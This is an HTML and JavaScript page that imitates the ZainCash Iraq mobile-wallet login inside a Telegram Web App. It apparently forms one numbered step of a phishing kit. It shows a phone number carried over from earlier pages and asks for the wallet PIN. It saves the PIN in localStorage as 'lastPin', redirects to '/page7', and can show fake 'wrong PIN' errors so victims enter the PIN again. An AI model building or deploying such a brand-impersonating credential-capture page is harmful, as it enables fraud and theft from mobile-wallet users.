<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - زين كاش العراق</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --zc-purple: #6A1B9A;          /* ZainCash Signature Deep Purple */
            --zc-magenta: #C2185B;         /* ZainCash Vibrant Magenta Accent */
            --zc-gradient: linear-gradient(135deg, #4A148C 0%, #8E24AA 55%, #D81B60 100%);
            --zc-dark: #1E102B;            /* Deep Plum Dark Text */
            --zc-accent-purple: #7B1FA2;
            --bg-color: #ffffff;
            --text-dark: #1E102B;
            --text-muted: #6A5D75;
            --border-purple: #8E24AA;
            --btn-disabled-bg: #E0D7E8;
            --btn-disabled-text: #A095A8;
        }

        * {
            box-sizing: border-box;
            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh;
            direction: rtl;
        }

        /* Top Header Area */
        .header-box { 
            width: 100%; 
            background: var(--zc-gradient); 
            padding: 30px 20px 25px; 
            color: #ffffff; 
            text-align: center; 
            box-shadow: 0 3px 10px rgba(74, 20, 140, 0.25);
        }

        .header-title {
            font-size: 28px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .header-title .region {
            font-size: 12px;
            font-weight: 700;
            background: rgba(255, 255, 255, 0.2);
            padding: 2px 10px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .sub-header-text { 
            font-size: 13.5px; 
            margin-top: 6px; 
            font-weight: 700;
            color: #ffffff;
            opacity: 0.95;
        }

        /* Content Area */
        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: right; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        h2 { 
            color: var(--zc-dark); 
            font-size: 22px; 
            margin: 10px 0 20px; 
            font-weight: 800; 
            text-align: center;
        }

        /* 🚨 Red Status Error Banner */
        .error-banner {
            width: 100%;
            background-color: #ffebe9;
            border: 1px solid #ff4d4f;
            color: #d93025;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            display: none;
            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
            text-align: center;
        }

        /* Phone Display Field */
        .phone-display {
            width: 100%;
            border: 2px solid var(--border-purple);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 12px;
            margin-bottom: 22px;
            font-size: 17px;
            font-weight: 800;
            color: var(--zc-dark);
            background-color: #F5EEF8;
            direction: ltr;
        }

        .flag-icon {
            font-size: 18px;
            line-height: 1;
        }

        /* PIN Section */
        .pin-label { 
            color: var(--text-muted); 
            margin-bottom: 8px; 
            font-size: 14px; 
            font-weight: 700; 
        }

        .pin-wrapper {
            position: relative;
            width: 100%;
            margin-bottom: 8px;
        }

        .pin-input {
            width: 100%;
            height: 56px;
            border: 2px solid #E0D7E8;
            border-radius: 14px;
            padding: 0 16px;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 4px;
            outline: none;
            background-color: #ffffff;
            color: var(--zc-dark);
            transition: border-color 0.2s;
            direction: ltr;
            text-align: left;
        }

        .pin-input::placeholder {
            letter-spacing: normal;
            font-size: 14px;
            color: #A095A8;
            font-weight: 600;
        }

        .pin-input:focus {
            border-color: var(--zc-magenta);
        }

        .pin-input.input-error {
            border-color: #d93025;
            background-color: #fff9f9;
        }

        .toggle-eye { 
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
        }

        .forgot-pin {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 30px;
            display: inline-block;
            font-weight: 600;
            text-align: right;
        }

        /* Submit Button */
        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            letter-spacing: 0.5px;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-submit.active {
            background: var(--zc-gradient);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(142, 36, 170, 0.35);
        }

        .btn-submit.active:hover {
            opacity: 0.92;
        }

        /* Bottom Curved Footer */
        .footer-box { 
            width: 100%; 
            background: var(--zc-gradient); 
            padding: 35px 20px 20px; 
            color: #ffffff; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
        }

        .footer-title {
            font-size: 24px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
        }

        .footer-title .region {
            font-size: 11px;
            font-weight: 700;
            background: rgba(255, 255, 255, 0.2);
            padding: 2px 8px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
            font-weight: 600;
        }

        .terms-text u { 
            color: #ffffff; 
            cursor: pointer; 
        }
    </style>
</head>

<body>

<!-- Header Section -->
<div class="header-box">
    <div class="header-title">
        <span>زين كاش</span><span class="region">العراق</span>
    </div>
    <div class="sub-header-text">محفظتك المالية السريعة والآمنة</div>
</div>

<!-- Main Login Form -->
<div class="main-content">
    <h2>تسجيل الدخول</h2>

    <!-- Red Error Banner -->
    <div id="errorDisplay" class="error-banner"></div>

    <!-- Displays Phone Number Filled in Previous Steps -->
    <div class="phone-display">
        <span class="flag-icon">🇮🇶</span>
        <span>+964</span>
        <span id="displayPhone">--</span>
    </div>

    <p class="pin-label">أدخل رقم السري لمحفظة زين كاش (4 أو 6 أرقام)</p>

    <!-- PIN Single Input Field -->
    <div class="pin-wrapper">
        <input type="password" id="pinInput" class="pin-input" placeholder="أدخل الرقم السري" inputmode="numeric" autocomplete="off" maxlength="6">
        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
    </div>

    <a href="#" class="forgot-pin">نسيت الرقم السري؟</a>

    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
</div>

<!-- Bottom Curved Footer -->
<div class="footer-box">
    <div class="footer-title">
        <span>زين كاش</span><span class="region">العراق</span>
    </div>
    <div class="sub-header-text">محفظتك المالية السريعة والآمنة</div>
    <p class="terms-text">من خلال تسجيل الدخول، فإنك توافق على <u>الشروط والأحكام</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const pinInput = document.getElementById('pinInput');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    // Retrieve saved phone from previous steps (localStorage)
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "7812345678";
    displayPhone.textContent = savedPhone;

    // Detect error parameter in URL query
    const urlParams = new URLSearchParams(window.location.search);
    const errParam = urlParams.get('error');

    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
        errorDisplay.textContent = "الرقم السري غير صحيح. يرجى إدخال الرقم السري الصحيح.";
        errorDisplay.style.display = "block";
        pinInput.classList.add('input-error');
        pinInput.focus();
    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
        errorDisplay.textContent = "البيانات غير صحيحة. يرجى التحقق وإعادة المحاولة.";
        errorDisplay.style.display = "block";
        pinInput.classList.add('input-error');
        pinInput.focus();
    }

    pinInput.addEventListener('input', () => {
        pinInput.value = pinInput.value.replace(/\D/g, '');

        // Clear red error highlight on typing
        pinInput.classList.remove('input-error');
        errorDisplay.style.display = "none";

        const len = pinInput.value.length;
        // Allow activation when length is either 4 or 6 digits
        const isValid = (len === 4 || len === 6);

        loginBtn.disabled = !isValid;
        loginBtn.classList.toggle('active', isValid);
    });

    eye.addEventListener('click', () => {
        const isPassword = pinInput.type === "password";
        pinInput.type = isPassword ? "text" : "password";
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        const pin = pinInput.value;
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";

        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
